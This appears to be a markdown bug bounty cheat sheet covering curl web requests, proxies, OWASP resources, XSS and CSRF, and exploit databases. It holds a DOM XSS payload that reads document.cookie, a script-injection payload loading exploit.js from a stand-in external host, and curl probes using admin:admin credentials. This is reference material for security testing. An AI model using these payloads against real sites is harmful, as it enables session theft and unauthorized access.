# Bug Bounty

Overview
---------
1. - [Web Requests](#1---web-requests)
2. - [Web Proxies](#2---web-proxies)
3. - [Online Resources](#3---online-resources)
4. - [Sensitive Data Exposure](#4---sensitive-data-exposure)
5. - [HTML Injection](#5---html-injection)
6. - [Cross-Site Scripting (XSS)](#6---cross-site-scripting-xss)
7. - [Cross-Site Request Forgery (CSRF)](#7---cross-site-request-forgery-csrf)
8. - [Exploit Research](#8---exploit-research)

   
#1. - Web Requests
-----------------------------------------

- Curl

```
$ curl -v <URL>
$ curl -I <URL>
$ curl -i <URL>
$ curl -v -X OPTIONS <URL>
$ curl -u admin:admin <URL>
$ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' <URL>
$ curl <URL>/search.php?search=test
$ curl -X POST -d 'username=admin&password=admin' <URL>
$ curl -X POST -d '{"search":"test"}' -H 'Content-Type: application/json' <URL>
$ curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' <URL>
$ curl -H 'Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' <URL>
```

- DevTools

```
F12
```

#2. - Web Proxies
-----------------------------------------

- Burp Suite

- ZAP Proxy

#3. - Online Resources
-----------------------------------------

- OWASP Web Security Testing Guide

```
https://owasp.org/www-project-web-security-testing-guide/
https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing
```

- HTML - CSS - JS Online Editor

```
https://html-css-js.com/
```

- HTML WYSIWYG Online Editor

```
https://htmlg.com/html-editor/
```

- JSFiddle Code Playground

```
https://jsfiddle.net/
```

#4. - Sensitive Data Exposure
-----------------------------------------

- Source Code

```
Right-click -> View page source
OR
CTRL + U
```

#5. - HTML Injection
-----------------------------------------

- Hyperlink

```
<a href="http://www.google.com">Click Me</a>
```

#6. - Cross-Site Scripting (XSS)
-----------------------------------------

*Reflected XSS	= Occurs when user input is displayed on the page after processing (e.g., search result or error message).*

*Stored XSS = Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).*

*DOM XSS	= Occurs when user input is directly shown in the browser and is written to an HTML DOM object (e.g., vulnerable username or page title).*

- DOM XSS

```
#"><img src=/ onerror=alert(document.cookie)>
```

#7. - Cross-Site Request Forgery (CSRF)
-----------------------------------------

- Password Change

```
"><script src=//www.example.com/exploit.js></script>
```

#8. - Exploit Research
-----------------------------------------

- CVEdetails

```
https://www.cvedetails.com/
```

- Exploit DB

```
https://www.exploit-db.com/
```

- Vulners

```
https://vulners.com/
```

- Rapid7

```
https://www.rapid7.com/db/
```

- Vulnerability Lab

```
https://www.vulnerability-lab.com/
```

- Packet Storm Security

```
https://packetstormsecurity.com/
```
